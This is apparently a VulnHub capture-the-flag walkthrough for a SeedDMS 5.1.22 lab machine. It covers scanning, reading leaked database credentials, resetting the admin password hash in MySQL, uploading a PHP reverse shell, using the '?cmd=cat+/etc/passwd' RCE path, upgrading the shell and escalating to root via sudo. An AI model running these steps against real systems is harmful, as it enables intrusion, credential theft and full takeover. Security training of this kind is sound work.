Target Identification

Identify the IP addr of the target machine 
MAC address: 08:00:27:9c:8d:48 
  
$sudo netdiscover -r 172.20.10.0/24 
  
<img src='./Assets/Screenshot_1.png' alt='descriptive_pic'/>
  
172.20.10.2      


Port Scan
  
• Scan for open ports 
• To get information about open services 
  
$nmap -sV -p- 172.20.10.2 
  
<img src='./Assets/Screenshot_2.png' alt='descriptive_pic'/>

  
Open ports 
• 80             http 
• 3306        mysql 
• 33060     mysqlx 
  
  
• The SSH port is not open 
• We have to find a way to do remote command execution on the target  
• We can't  bruteforce  
• We may have to read the codes on the webserver 
  
	
Inspect the website 

Visit the URL: http://172.20.10.2/ 

There is no much information on the homepage 
 
<img src='./Assets/Screenshot_3.png' alt='descriptive_pic'/>

  
• Right click on the webpage 
• select inspect element 
• select network tab 
• click on reload 
• Scroll up, you locate a main.js file. Click on it. 
 
<img src='./Assets/Screenshot_4.png' alt='descriptive_pic'/>

 
 
* At the right hand side of the page, click on Response 
* Scroll down, you will see a comment talking about js file (seeddms51x) 
* //make sure this js file is same as installed app on our server endpoint: /seeddms51x/seeddms-5.1.22/ 
 
<img src='./Assets/Screenshot_5.png' alt='descriptive_pic'/>

 
  
There is a Document Management System link (/seeddms51x/seeddms-5.1.22/) 

  
Enumerate the directories 

To find hidden files

┌──(kali㉿kali)-[~/Downloads/vulnhub/hackmeplease] 
└─$ gobuster dir -u  http://172.20.10.2/seeddms51x/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 

<img src='./Assets/Screenshot_6.png' alt='descriptive_pic'/>


There are four hidden files

Lets look at git repo for any exploit for the DMS 
  
https://sourceforge.net/p/seeddms/code/ci/5.1.22/tree/ 
  
https://www.exploit-db.com/exploits/47022 
  
There are lots of directories in the repo 
conf which is the configuration of the web app 
  
  <img src='./Assets/Screenshot_7.png' alt='descriptive_pic'/>


  
  
   
http://172.20.10.2/seeddms51x/conf 
  
<img src='./Assets/Screenshot_8.png' alt='descriptive_pic'/>

  
• we got forbidden feedback for the directory 
• that means there is a .htaccess file that restrict directory browsing 
  
  
  <img src='./Assets/Screenshot_9.png' alt='descriptive_pic'/>


  
* .htaccess can be seen from the repository 
settings.xml template might be a flag 
* we can assume there might be a misconfiguration in .htaccess file which can give us access to the database credentials. 
Adding the settings.xml to the directory 
  
http://172.20.10.2/seeddms51x/conf/settings.xml 
  
  
<img src='./Assets/Screenshot_10.png' alt='descriptive_pic'/>

  
* we got the database server's username and password 
* Login to the server 
  
  
$mysql -h 172.20.10.2  -u seeddms -p seeddms  -D seeddms 
  
<img src='./Assets/Screenshot_11.png' alt='descriptive_pic'/>

  
We are to see the list of tables. 
  
Command:  show tables; 
  
<img src='./Assets/Screenshot_12.png' alt='descriptive_pic'/>

  
  
* There are different tables but there is one that is users 
* This will have the list of users in the database.
* Lets see its content 
  
command: select * from users; 
  
  <img src='./Assets/Screenshot_13.png' alt='descriptive_pic'/>


  
* we got the password of a user but we don't his username 
* we can update the password of the admin then login into the web app. 
  
command: SELECT login, pwd FROM tblUsers; 
  
<img src='./Assets/Screenshot_14.png' alt='descriptive_pic'/>

  
* we have the md5 hash of admin password 
* Lets change the password to admin and generate its MD5 hash. 
  
  <img src='./Assets/Screenshot_15.png' alt='descriptive_pic'/>


Update the new password hash 
  
command: UPDATE tblUsers 
*   →  SET pwd= '21232f297a57a5a743894a0e4a801fc3' 
*   →  WHERE login= 'admin' ; 
  
  
  <img src='./Assets/Screenshot_16.png' alt='descriptive_pic'/>


  
  
Then go to the login page 
  
<img src='./Assets/Screenshot_17.png' alt='descriptive_pic'/>

  
Then login using admin as username and password 
  
  
<img src='./Assets/Screenshot_18.png' alt='descriptive_pic'/>

  
* It seems this web page is to manage documents online. 
* There is a tab to upload file,s. 
* Lets create a web shell and upload it to gain remote command execution. 
 
 
<img src='./Assets/Screenshot_19.png' alt='descriptive_pic'/>

 
 
* Use locate command to locate the reverse shell php 
* Scroll down till you locate  "/usr/share/laudanum/php/php-reverse-shell.php" 


<img src='./Assets/Screenshot_20.png' alt='descriptive_pic'/>
                                   

  
shell.php was created 
 
<img src='./Assets/Screenshot_21.png' alt='descriptive_pic'/>

 
* Edit the shell using nano command 
* Use down arrow key to scroll down to the line of the IP and Port 
* Change the IP addr to IP addr of the (Attacking machine) and the port number to any number as listening port 
* Use Ctrl O to save and Ctrl X to exit 
 
<img src='./Assets/Screenshot_22.png' alt='descriptive_pic'/>

 
Upload it 
  
  

  <img src='./Assets/Screenshot_23.png' alt='descriptive_pic'/>

  
  
  <img src='./Assets/Screenshot_24.png' alt='descriptive_pic'/>


  
* The Web shell (shell.php) has been uploaded. 
* Click on the uploaded shell to see its information 
The file ID is 7 in my case. 
  
 <img src='./Assets/Screenshot_25.png' alt='descriptive_pic'/>


  
Lets start listening from the target machine using the port  
 
<img src='./Assets/Screenshot_26.png' alt='descriptive_pic'/>

 
 
  
https://www.exploit-db.com/exploits/47022 
1. : Now after uploading the file check the document id corresponding to the document. 
1. : Now go to example.com/data/1048576/"document_id"/1.php?cmd=cat+/etc/passwd to get the command response in browser. 
  
Note: Here "data" and "1048576" are default folders where the uploaded files are getting saved. 
  
* Default: example.com/data/1048576/"document_id"/1.php 
* Change the document ID to 7. 
http://172.20.10.2/seeddms51x/data/1048576/7/1.php 
  
 
<img src='./Assets/Screenshot_27.png' alt='descriptive_pic'/>

 
We are listening at port 465 
  
<img src='./Assets/Screenshot_28.png' alt='descriptive_pic'/>

* We have the reverse shell. 
* Go to the etc/passwd file. 
* we found the username as saket. 
  
command: grep bash etc/passwd 
  
<img src='./Assets/Screenshot_29.png' alt='descriptive_pic'/>

  
Let's upgrade the shell to bash shell using python script. 
  
command: python3 -c 'import pty;pty.spawn("/bin/bash")' 
  
<img src='./Assets/Screenshot_30.png' alt='descriptive_pic'/>

  
* Now we have the bash shell. 
* Lets change the directory to saket. 
* we already have his password (Saket@#$1337).
  
$ su -l saket 
  
<img src='./Assets/Screenshot_31.png' alt='descriptive_pic'/>

  
Check the sudo permission of the user 
    

  <img src='./Assets/Screenshot_32.png' alt='descriptive_pic'/>

  
* The user saket has access to everything. 
* Lets get to the root. 
  
  
<img src='./Assets/Screenshot_33.png' alt='descriptive_pic'/>

  
We got the root shell
